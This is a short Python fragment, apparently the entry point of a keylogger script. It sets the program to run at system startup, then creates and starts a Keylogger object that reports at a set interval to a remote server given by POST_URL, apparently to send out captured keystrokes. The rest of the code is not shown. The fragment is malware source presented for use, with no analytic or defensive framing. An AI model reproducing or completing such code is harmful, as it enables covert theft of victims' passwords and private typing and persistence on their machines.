if __name__ == "__main__":
    run_at_startup()
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, POST_EXPECTED_RESULT=POST_EXPECTED_RESULT, POST_KEY_NAME=POST_KEY_NAME, POST_URL=POST_URL)
    keylogger.start()